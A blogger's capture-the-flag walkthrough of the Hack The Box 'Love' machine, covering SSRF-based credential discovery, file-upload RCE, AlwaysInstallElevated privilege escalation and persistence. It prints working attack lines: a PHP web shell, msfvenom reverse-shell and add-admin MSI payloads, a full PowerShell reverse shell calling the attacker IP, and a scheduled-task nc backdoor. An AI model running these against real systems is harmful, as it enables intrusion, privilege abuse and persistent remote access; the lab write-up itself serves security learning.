## Love Hack The Box Walkthrough/Writeup: {#love-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Love>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
            -   `$machine` = the machine name e.g. `DC01`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.

-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}


#### Basic Scans: {#basic-scans}

-   **Basic TCP Scan**:
    -   `nmap $box -Pn -oA TCPbasicScan`
        ```shell
        üïô 06:05:33 zsh ‚ùØ nmap $box -oA TCPbasicScan
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 06:05 GMT
        Nmap scan report for 10.129.48.103
        Host is up (0.043s latency).
        Not shown: 993 closed tcp ports (reset)
        PORT     STATE SERVICE

        5000/tcp open  upnp

        Nmap done: 1 IP address (1 host up) scanned in 2.09 seconds

        ```
    -   **Initial thoughts**:
        -   HTTP/HTTPs
        -   SMB
        -   MYSQL
        -   Interestingly a service on 5000


#### Comprehensive Scans: {#comprehensive-scans}

-   **In depth scan TCP**:
    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`
        ```shell
          ali in HTB/BlogEntriesMade/Love/scans/nmap  üç£ main  1GiB/7GiB | 0B/1GiB with /usr/bin/zsh

        ```
    -   **Findings**:
        -   Looking at the certificate there is a DNS entry for `staging.love.htb` &amp; the organization name `ValentineCorp`.
            ```shell
            | ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
            ```
        -   I can see that the computer name is `love`
            ```shell
             |   Computer name: Love
            ```

#### Updating ETC/HOSTS &amp; Variables: {#updating-etc-hosts-and-variables}

-   **Updated Domain &amp; Machine Variables for Testing**:
    -   Now that I have this information, I can update the `domain` and `machine` variables used in tests:
        -   `update_var domain "love.htb"`
        -   `update_var machine "love"`

-   **Updating** `/etc/hosts` **for DNS and LDAP Queries**:
    -   I update my `/etc/hosts` file.
        -   `echo "$box   $domain staging.$domain" | sudo tee -a /etc/hosts`


### SMB `445`: {#smb-445}


#### Attempting to connect with NULL &amp; Guest sessions: {#attempting-to-connect-with-null-and-guest-sessions}

-   **This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold**:
    -   `netexec smb $box -u 'guest' -p '' --shares`
    -   `netexec smb $box -u '' -p '' --shares`
    -   {{< figure src="/ox-hugo/2024-12-23-060849_.png" >}}


### Service `5000`: {#service-5000}

-   I try and access the service on this port via telnet and the browser but it's forbidden.
    -   `telnet $box 5000`
    -   `curl http://$box:5000 -v -L`
        -   {{< figure src="/ox-hugo/2024-12-23-145218_.png" >}}
        -   Forbidden.


### Service `7680`: {#service-7680}

-   I get no response from this service via telnet or curl.
    -   `telnet $box 7680`
    -   `curl http://$box:7680 -v -L`
    -   {{< figure src="/ox-hugo/2024-12-23-145437_.png" >}}


### Web `80/443`: {#web-80-443}

-   **Web Enumeration via Burp Suite**:
    -   When enumerating a website, always use Burp Suite. This allows you to:
        -   Record all potential injection points.
        -   Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress.


#### Whatweb: {#whatweb}

-   Lets run "whatweb" to see if I can glean some further information:
    -   `whatweb $box | sed 's/, /\n/g'`
        ```shell
        kali in HTB/BlogEntriesMade/Love/scans/nmap  üç£ main  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
        üïô 06:37:10 zsh ‚ùØ whatweb $box | sed 's/, /\n/g'

        ```
    -   +Note+: I use `sed` to put the output across multiple lines for easier reading.


#### Dirbusting the webserver using ferox: {#dirbusting-the-webserver-using-ferox}

-   **I Perform some directory busting to see if there are any interesting directories**:
    -   `feroxbuster -u http://$domain/ --threads 20 --scan-limit 2 -q -r -o $domainFeroxScan.txt`
        -   There are alot of hits as well as an admin panel.
            -   {{< figure src="/ox-hugo/2024-12-23-161355_.png" >}}
        -   There are these files in `ADMIN` however they do not yield anything of note when I access them.
            -   {{< figure src="/ox-hugo/2024-12-23-133255_.png" >}}


#### love.htb: {#love-dot-htb}


##### Visiting the web page: {#visiting-the-web-page}

-   It's always good to just manually click around and manually enumerate the pages available.
-   I visit the web page <http://love.htb/index.php> and it's a login page for a voting system.
    -   I try and login with test credentials and capture the post request.
        -   {{< figure src="/ox-hugo/2024-12-23-071110_.png" >}}


##### Bruteforcing Login with FFUF: {#bruteforcing-login-with-ffuf}

-   Lets try some bruteforcing, for fun. I get the `POST` request from burp
    -   {{< figure src="/ox-hugo/2024-12-23-071216_.png" >}}
    -   I modify it to the below so it's compatible with ffuf.

```

-   I let it run but get no hits.


##### Reading the source code: {#reading-the-source-code}

-   I check the source code of the page as sometimes I can find useful information such as dev comments etc.
-   I can see that the service is using software called `ADMINLTE`
    -   {{< figure src="/ox-hugo/2024-12-23-072144_.png" >}}

-   After some quick searching I find there is a vuln for LFI however it does not appear to vulnerable.
    -   <https://security.snyk.io/vuln/SNYK-JS-ADMINLTE-3314993>


#### staging.love.htb: {#staging-dot-love-dot-htb}


##### Visiting the web page: {#visiting-the-web-page}

-   Looking at the page it's a file scanner.
    -   {{< figure src="/ox-hugo/2024-12-23-140120_.png" >}}
-   There is a DEMO where I can enter URL to have it scan.


#### Discovering the DEMO page is vulnerable to SSRF: {#discovering-the-demo-page-is-vulnerable-to-ssrf}

-   I stand a python webserver and enter the information into the scanner on the site.
    -   {{< figure src="/ox-hugo/2024-12-23-140522_.png" >}}
    -   I can see I get a valid connection.

-   I enter local host address <http://127.0.0.1:80> and it shows the login box for the service running on the root web address `love.htb`. This signifies a SSRF vulnerability
    -   {{< figure src="/ox-hugo/2024-12-23-140816_.png" >}}


#### Retrieving Clear Text Credentials from the service running on port 5000: {#retrieving-clear-text-credentials-from-the-service-running-on-port-5000}

-   As I now know there is an SSRF vulnerability. I access the services I know are running but cannot access `7680` &amp; `5000` so far.

-   **Service** `7680`:
    -   {{< figure src="/ox-hugo/2024-12-23-145640_.png" >}}
    -   I get no hits.

-   **Service** `5000`:
    -   I get a hit &amp; retrieve clear text creds from a password service that is only accessible via `localhost`.
        -   {{< figure src="/ox-hugo/2024-12-23-145719_.png" >}}
        -   **Creds**: `admin:@LoveIsInTheAir!!!!`


##### Conducting An Internal Port Scan VIA The SSRF Vulnerability: {#conducting-an-internal-port-scan-via-the-ssrf-vulnerability}

-   To ensure that I do not miss anything I also conduct an internal port scan for all ports in-case there is anything else running internally.

-   I create a port list to use:
    ```shell
    seq 1 65535 > Ports.txt
    ```

<!--listend-->

-   I copy the POST request from Burp.
    -   {{< figure src="/ox-hugo/2024-12-23-143725_.png" >}}
    -   I modify the curl command so it can be used with ffuf:
        -   adding the wordlist `-w`
        -   specifying the url `-u`
        -   adding the injection point:
            -   `http://127.0.0.1:FUZZ`
        -   Removing the newlines and making 1 line
        -   Proxying all traffic via burp
            -   `-x http://127.0.0.1:8080`
        -   Remove size of 61 `-fs 61`
            -   This can only be done once I have the initial response so I can then filter for the standard response.

```

-   I have added the image of the command below as I know sometimes the formatting of my site can lead to the code boxes running off of the page. (will fix, soz bbz)
    -   {{< figure src="/ox-hugo/2024-12-23-144357_.png" >}}

-   **Findings**: I just get a list of all the ports I have already found and nothing additional of note.


#### Accessing the admin panel: {#accessing-the-admin-panel}

-   I use the creds on the admin panel to login
    -   {{< figure src="/ox-hugo/2024-12-23-161451_.png" >}}

-   Looking at the admin panel I can see it's called "Voting System" I do some googling and find the source code here - <https://code-projects.org/voting-system-in-php-with-source-code/>


## 2. Foothold: {#2-dot-foothold}


### Getting RCE on the host &amp; a reverse shell: {#getting-rce-on-the-host-and-a-reverse-shell}

-   I do some searching and find an [SQL vulnerability](https://github.com/h4md153v63n/CVEs/blob/main/Voting_System/Voting_System-SQL_Injection-2.md) that enables the ability to dump the voters database, however if I look at the voters panel on the admin portal there are no registered users. So we could dump it and get an empty `db`.
    -   {{< figure src="/ox-hugo/2024-12-23-165345_.png" >}}

-   Looking further I find this exploit enabling RCE via an authenticated file upload attack.
    -   <https://www.exploit-db.com/exploits/49445>
        -   Looking at the exploit it's apparent that this is just a PHP reverse shell being uploaded as a profile photo for a user.
        -   The script connects, creates a new user and uploads the photo as a reverse shell, it then requests the reverse shell &amp; triggers it.

-   To verify this works I create a simple `php` shell &amp; save it as `shell.php`
    ```php
    <?php system($_GET['cmd']); ?>
    ```

-   I upload it.
    -   {{< figure src="/ox-hugo/2024-12-23-174606_.png" >}}

-   I open the image in a new tab.
    -   {{< figure src="/ox-hugo/2024-12-23-174629_.png" >}}

-   I enter a simple command and it executes proving it's vulnerable and that I have RCE.
    -   `http://love.htb/images/shell.php?cmd=dir`
    -   {{< figure src="/ox-hugo/2024-12-23-174823_.png" >}}

-   Now I could get a reverse-shell but this a chance for me to play with tools I don't really use often, so I am going to use the [wwwolf-php-webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell). It's an amazing interactive web-shell.

-   I download the main `webshell.php` file and repeat the same process as before, uploading as a profile pic for a new user and then accessing that profile pic.

-   When I view the image I have this nice interactive webshell
    -   {{< figure src="/ox-hugo/2024-12-23-181927_.png" >}}

-   Let's grab our user flag:
    -   {{< figure src="/ox-hugo/2024-12-23-182110_.png" >}}

-   I upload nc64.exe.
    -   {{< figure src="/ox-hugo/2024-12-23-182216_.png" >}}
    -   My webshell fun was short-lived, I want to run tools easily on the host OS.

-   I connect back to my attack machine &amp; get a reverse shell.
    -   {{< figure src="/ox-hugo/2024-12-23-182401_.png" >}}


### Enumerating the host as phoebe: {#enumerating-the-host-as-phoebe}

-   I can see I am logged in as a user called `phoebe` I run the following command to enumerate information about her and other logged in users.
    -   `whoami /priv /groups; query user; net user`
    -   **Shows**:
        -   User privs
        -   User Group membership
        -   Other logged in users
        -   All users on the machine: (done last as list may be extensive)
    -   {{< figure src="/ox-hugo/2024-12-23-182925_.png" >}}
        -   Nothing of note here.

-   I upload Winpeas and execute it.
    -   It extracts phoebes NTLMv2 hash. I run it through hashcat against rock you but it won't crack.
    -   {{< figure src="/ox-hugo/2024-12-24-071628_.png" >}}
    -   +Note+: As this is an easier box, I am not making a custom wordlist with CeWL as I don't see that being a viable option given the difficulty of the box.

-   **Always install elevated available**: Which can be a viable privesc path.
    -   {{< figure src="/ox-hugo/2024-12-24-074847_.png" >}}

-   **It is possible to check this setting manually too by querying the registry directly**
    -   Enumerate if the Key exists (&amp; therefore policy enabled) using Powershell:
        ```powershell

        #Query machine policy (system wide):
        reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

        #Query user policy (is the key set for the user I are logged in with )
        reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

        ```

        -   {{< figure src="/ox-hugo/2024-12-24-080900_.png" >}}
            -   As I can see it's set globally as a machine policy, this is bad! As it means that any user can install anything with admin privileges. We can use this to elevate to System.


#### Primer: Key Differences in reg queries: {#primer-key-differences-in-reg-queries}

1.  **Registry Hive Scope**:
    -   `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`:
        -   Refers to `HKEY_LOCAL_MACHINE (HKLM)`, which applies settings at the **system-wide level**.
        -   Changes here affect **all users on the machine**.

    -   `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`:
        -   Refers to `HKEY_CURRENT_USER (HKCU)`, which applies settings at the **user-specific level**.
        -   Only affects the currently logged-in user.

2.  **Purpose**
    -   `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`:
        -   specifically queries the `AlwaysInstallElevated` value in the `HKEY_LOCAL_MACHINE` hive.
        -   Represents a system-wide policy that determines if MSI files can be installed with elevated privileges (Administrator rights).
            -   **Enabled (`1`)**: Allows all users to install MSI files with elevated privileges.
            -   **Disabled (`0` or absent)**: Prevents this behavior globally.

    -   `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`:
        -   Specifically queries the `AlwaysInstallElevated` value.
        -   Determines whether the user can install software with elevated privileges (Administrator rights).
            -   **Enabled (`1`)**: Allows installing MSI files with elevated privileges.
            -   **Disabled (`0` or absent)**: Prevents this behavior.


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### Privesc Method 1: Creating a malicious msi reverse shell with msfvenom: {#privesc-method-1-creating-a-malicious-msi-reverse-shell-with-msfvenom}

-   I use msfvenom to create a malicious `evil.msi` file that is a reverse shell
    -   `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.80 LPORT=8888 -a x64 --platform Windows -f msi -o evil.msi`
    -   {{< figure src="/ox-hugo/2024-12-24-081045_.png" >}}

-   I standup my python webserver.
    -   `python3 -m http.server 9000`

-   Copy the malicious `msi` to the host:
    -   {{< figure src="/ox-hugo/2024-12-24-081339_.png" >}}

-   Standup my nc listener:
    -   `rlwrap -cAr nc -nvlp 8888`

-   Run the `.msi` file and catch my `NT/Authority\system` shell.
    -   {{< figure src="/ox-hugo/2024-12-24-081500_.png" >}}

-   Get the root flag:
    -   {{< figure src="/ox-hugo/2024-12-24-081550_.png" >}}


### Privesc Method 2: Adding a new Admin User with msfvenom: {#privesc-method-2-adding-a-new-admin-user-with-msfvenom}

-   +Note+: This method is a bit more long winded and uses the same exploitation method of "always install elevated" but is a different route.

-   I use msfvenom to create our malicious `msi` to add a new user.
    ```shell
    msfvenom -p windows/adduser USER=bloodstiller PASS=BL00dstiLL3r# --platform Windows -f msi -o addAdminUser.msi
    ```

    -   {{< figure src="/ox-hugo/2024-12-24-121654_.png" >}}

-   I standup my python webserver.
    -   `python3 -m http.server 9000`

-   Copy the malicious `msi` to the host:
    -   {{< figure src="/ox-hugo/2024-12-24-121738_.png" >}}

-   Verify there are only the legitimate users on the host:
    -   {{< figure src="/ox-hugo/2024-12-24-121836_.png" >}}

-   Run the malicious `addAdminUser.msi`:
    -   {{< figure src="/ox-hugo/2024-12-24-121926_.png" >}}

-   Verify the user has been added:
    -   {{< figure src="/ox-hugo/2024-12-24-121949_.png" >}}

-   Now I **cannot** to use `/runas` as the shell is limited so I cannot pass credentials directly. Instead to run commands as the new user I will need to use a `PowerShell Credentialed Object`.
    -   **A PowerShell credential object is** an instance of the `System.Management.Automation.PSCredential` class that securely stores a username and password, created using `Get-Credential` (gui-prompt) or manually with the below (which I will use.)
        ```powershell
        #1. Use secure sring to pass our password and store in the $pass var:
        $pass = convertto-securestring 'BL00dstiLL3r#' -asplain -force

        #2. Pass our username:
        $username = "bloodstiller"

        #3. Pass username & password into one var $cred:
        $cred = New-Object System.Management.Automation.PSCredential ($username, $pass)

        #4. Run our Command passing it the "Credential $credential" arg + var:
        #Command:
        [command] -Credential $cred
        ```
-   You might be tempted to try the below to simply read the file, however it won't work.
    ```powershell
    cat C:\Users\Administrator\Desktop\root.txt -Credential $cred
    ```

    -   {{< figure src="/ox-hugo/2024-12-24-123652_.png" >}}
    -   The error occurs because the FileSystem provider in PowerShell does not support passing credentials directly when accessing files using commands like `cat` (alias for `Get-Content`). Instead I need to modify the command:
        -   Commands like `Get-Content` or `cat` directly interact with the file system in **the current user‚Äôs context**. The FileSystem provider **does not support credentials for local file access**.
        -   Simply specifying `-Credential` without creating a new session (or drive mapping) has no effect for these commands because local file access relies **on the caller‚Äôs current security context**.

-   **I can however read it another way by running a subscript as that user**:
    ```powershell
    Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { Get-Content -Path "C:\Users\Administrator\Desktop\root.txt"}
    ```

    -   **Why this works**:
        -   `Invoke-Command`:
            -   Spawns a session under the specified credentials. (the ones I provide)
            -   The command inside the `-ScriptBlock` executes in that session.
        -   **Subcommand** (e.g., `Get-Content`):
            -   Runs as if it were invoked directly by the impersonated user, bloodstiller.
            -   Can access files and resources that the current user cannot.

-   **In action**:
    -   {{< figure src="/ox-hugo/2024-12-24-125013_.png" >}}

        1.  I can see I am the user `Phoebe`
        2.  I run the command to read the file in the context of my admin user `bloodstiller` which is successful and returns the flag (as this user is part of the admin group.)
        3.  I try and read it in the context of `Phoebe` which is denied due not sufficient permissions.

        +Note+: The blurred parts are just empty lines I included to make the output easier to read.

-   I can then start a reverse shell in the context of the user `bloodstiller`.
    ```powershell
    Start-Process powershell -Credential $cred -ArgumentList '-NoP -NonI -W Hidden -Exec Bypass -Command "& { $client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.80\",6666); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | % {0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \"; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush(); }; $client.Close(); }"'
    ```

    -   {{< figure src="/ox-hugo/2024-12-24-131715_.png" >}}
        -   I can see that the user is `Phoebe`, but I get our shell in the context of the user `bloodstiller` who is in the administrators group as I passed it our credentials via the credentialed object.


## 4. Persistence: {#4-dot-persistence}


### Dumping Admin Hash with LaZagne.exe: {#dumping-admin-hash-with-lazagne-dot-exe}

-   I upload `LaZagne.exe` with a python webserver.
    -   I run it and dump the hashes on the system.
        -   {{< figure src="/ox-hugo/2024-12-24-084730_.png" >}}
    -   I did try `psexec` however I could not find any valid shares running so this did not work.
    -   I have the hashes but cannot pass them, lets look at other options.


### Adding a Scheduled Task To Call Back Out to us: {#adding-a-scheduled-task-to-call-back-out-to-us}

This is one of my favorite techniques as I can just set the task and whenever I want start our listener.

-   `schtasks /create /tn BkD00r /tr "C:\xampp\htdocs\omrs\images\nc64.exe 10.10.14.80 4433 -e cmd" /sc minute /mo 1 /ru system`
    -   {{< figure src="/ox-hugo/2024-12-24-134200_.png" >}}
        -   **Command Breakdown**:
            1.  `/sc minute`: Specifies that the task should run every minute.
            2.  `/mo 1`: Runs the task every 1 minute.
            3.  `/ru system`: Runs the task with System privileges.
            4.  `/tr`: Specifies the action to execute, in this case, running nc64.exe with the specified options.
        -   +Note+: This techniques runs every 1 minute and calls out to my attack machine. This means that even if I disconnect I can turn on my listener again and it will call back out to em.

-   **Shell Caught**:
    -   As I can see I caught the shell disconnected, started my listener again and was re-connected again.
        -   {{< figure src="/ox-hugo/2024-12-24-134332_.png" >}}

<!--listend-->

-   I now have two forms of persistence a user with admin privileges, albeit I need to follow the standard chain of web/reverse shell to then run commands in their context using a credentialed object or start our listener and get a system shell.


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I learned to just be persistent, again this is an easier box, but I was trying to rush it. Slow down and get it done properly.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  I tried to cred stuff the voting page and not the admin page initially, really need to stop seeing two fields for user input and trying to ram creds in there. So I learned to slow down and read.
